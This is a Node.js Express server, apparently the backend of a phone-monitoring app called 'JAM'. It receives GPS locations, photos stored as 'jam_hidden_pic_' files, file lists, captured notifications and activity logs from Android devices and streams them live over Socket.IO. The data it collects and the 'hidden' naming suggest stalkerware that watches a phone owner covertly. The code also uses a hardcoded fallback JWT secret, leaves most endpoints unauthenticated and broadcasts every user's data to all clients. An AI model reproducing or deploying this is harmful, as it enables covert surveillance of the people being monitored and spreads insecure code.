import express from 'express';
import cors from 'cors';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import { PrismaClient } from '@prisma/client';
import http from 'http';
import { Server } from 'socket.io';
import multer from 'multer';
import path from 'path';
import fs from 'fs';

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

const prisma = new PrismaClient();

app.use(cors());
app.use(express.json());

// Fixed: Using Environment Variable for Secret
const JWT_SECRET = process.env.JWT_SECRET || 'JAM_SUPER_SECRET_KEY_2026';

// Setup Multer Storage for photos
const uploadDir = path.join(__dirname, '../uploads');
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir, { recursive: true });
}

const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, uploadDir);
  },
  filename: function (req, file, cb) {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, 'jam_hidden_pic_' + uniqueSuffix + path.extname(file.originalname));
  }
});
const upload = multer({ storage: storage });

app.use('/uploads', express.static(uploadDir));

// Register API
app.post('/register', async (req, res) => {
  try {
    const { name, email, password } = req.body;
    const existingUser = await prisma.user.findUnique({ where: { email } });
    if (existingUser) {
      return res.status(400).json({ success: false, message: 'Email is already registered!' });
    }
    const hashedPassword = await bcrypt.hash(password, 10);
    await prisma.user.create({
      data: { name, email, password: hashedPassword }
    });
    res.json({ success: true, message: 'Account created successfully!' });
  } catch (error) {
    console.error('Registration Error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// Login API
app.post('/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    const user = await prisma.user.findUnique({ where: { email } });
    if (!user) {
      return res.status(400).json({ success: false, message: 'Invalid credentials!' });
    }
    const isMatch = await bcrypt.compare(password, user.password);
    if (!isMatch) {
      return res.status(400).json({ success: false, message: 'Invalid credentials!' });
    }
    const token = jwt.sign({ id: user.id }, JWT_SECRET, { expiresIn: '7d' });
    res.json({
      success: true,
      message: 'Login successful!',
      token,
      user: { id: user.id, name: user.name, email: user.email }
    });
  } catch (error) {
    console.error('Login Error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// Add Device API
app.post('/add-device', async (req, res) => {
  try {
    const { userId, deviceName, androidVersion, battery } = req.body;
    const newDevice = await prisma.device.create({
      data: { userId, deviceName, androidVersion, battery, status: 'online' }
    });
    res.json({ success: true, message: 'Device added successfully!', device: newDevice });
  } catch (error) {
    console.error('Add Device Error:', error);
    res.status(500).json({ success: false, message: 'Error adding device' });
  }
});

// Get Devices API
app.get('/devices/:userId', async (req, res) => {
  try {
    const { userId } = req.params;
    const devices = await prisma.device.findMany({ 
        where: { userId },
        orderBy: { createdAt: 'desc' }
    });
    res.json({ success: true, count: devices.length, devices });
  } catch (error) {
    console.error('Get Devices Error:', error);
    res.status(500).json({ success: false, message: 'Error fetching devices' });
  }
});

// Update Location API
app.post('/update-location', async (req, res) => {
  try {
    const { userId, latitude, longitude } = req.body;
    const userDevices = await prisma.device.findMany({
        where: { userId },
        orderBy: { createdAt: 'desc' }
    });

    if (userDevices.length > 0) {
        const latestDeviceId = userDevices[0].id;
        await prisma.device.update({
            where: { id: latestDeviceId },
            data: { latitude, longitude, status: 'online' }
        });
        
        io.emit('device_updated', { userId });
        res.json({ success: true, message: 'Location updated successfully!' });
    } else {
        res.status(404).json({ success: false, message: 'No device found to update' });
    }
  } catch (error) {
    console.error('Update Location Error:', error);
    res.status(500).json({ success: false, message: 'Error updating location' });
  }
});

// Upload Photo API
app.post('/upload-photo', upload.single('photo'), async (req, res) => {
  try {
    const { userId } = req.body;
    if (!req.file) {
      return res.status(400).json({ success: false, message: 'No photo received by server' });
    }
    // Fixed: Dynamic Host URL instead of localhost
    const baseUrl = req.protocol + '://' + req.get('host');
    const photoUrl = `${baseUrl}/uploads/${req.file.filename}`;
    
    console.log(`📸 New photo received from user: ${userId}`);
    io.emit('new_photo_received', { userId, photoUrl });
    res.json({ success: true, message: 'Photo securely uploaded!', photoUrl });
  } catch (error) {
    console.error('Upload Photo Error:', error);
    res.status(500).json({ success: false, message: 'Server error during photo upload' });
  }
});

// Delete Photo API
app.post('/delete-photo', async (req, res) => {
  try {
    const { userId, photoUrl } = req.body;
    if (!photoUrl) {
      return res.status(400).json({ success: false, message: 'Photo URL is required' });
    }
    const filename = photoUrl.split('/').pop();
    if (!filename) {
      return res.status(400).json({ success: false, message: 'Invalid photo URL' });
    }
    const filePath = path.join(__dirname, '../uploads', filename);
    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath);
      console.log(`🗑️ Photo deleted permanently: ${filename}`);
      io.emit('photo_deleted', { userId, photoUrl });
      res.json({ success: true, message: 'Photo deleted successfully!' });
    } else {
      res.status(404).json({ success: false, message: 'Photo not found on server' });
    }
  } catch (error) {
    console.error('Delete Photo Error:', error);
    res.status(500).json({ success: false, message: 'Server error during photo deletion' });
  }
});

// Sync Files API
app.post('/sync-files', async (req, res) => {
  try {
    const { userId, files } = req.body;
    if (!userId || !files) {
      return res.status(400).json({ success: false, message: 'Invalid file data received' });
    }
    console.log(`📁 Received ${files.length} files from user: ${userId}`);
    io.emit('files_updated', { userId, files });
    res.json({ success: true, message: 'Files synced successfully!' });
  } catch (error) {
    console.error('Sync Files Error:', error);
    res.status(500).json({ success: false, message: 'Server error during file sync' });
  }
});

// Sync Notifications API
app.post('/sync-notifications', async (req, res) => {
  try {
    const { userId, packageName, title, text } = req.body;
    if (!userId) return res.status(400).json({ success: false, message: 'Invalid data' });
    console.log(`🔔 New Notification from ${userId}: [${packageName}] ${title}`);
    io.emit('notification_received', { userId, packageName, title, text });
    res.json({ success: true, message: 'Notification synced!' });
  } catch (error) {
    console.error('Sync Notification Error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// Sync Activity Logs API
app.post('/sync-activity-logs', async (req, res) => {
  try {
    const { userId, action, details } = req.body;
    if (!userId || !action) {
      return res.status(400).json({ success: false, message: 'Invalid log data received' });
    }
    const timestamp = new Date().toISOString();
    console.log(`📊 New Activity Log from ${userId}: [${action}] ${details}`);
    io.emit('activity_log_received', { userId, action, details, timestamp });
    res.json({ success: true, message: 'Activity Log synced successfully!' });
  } catch (error) {
    console.error('Sync Activity Log Error:', error);
    res.status(500).json({ success: false, message: 'Server error during log sync' });
  }
});

// Socket.IO Connection Handler
io.on('connection', (socket) => {
  console.log(`🔌 A client connected: ${socket.id}`);
  socket.on('disconnect', () => {
    console.log(`❌ Client disconnected: ${socket.id}`);
  });
});

// Fixed: Using Dynamic Port for Cloud deployment
const PORT = process.env.PORT || 5000;
server.listen(PORT, () => {
  console.log(`🚀 JAM API is running!`);
  console.log(`🛡️ JAM Server is active on port ${PORT}`);
});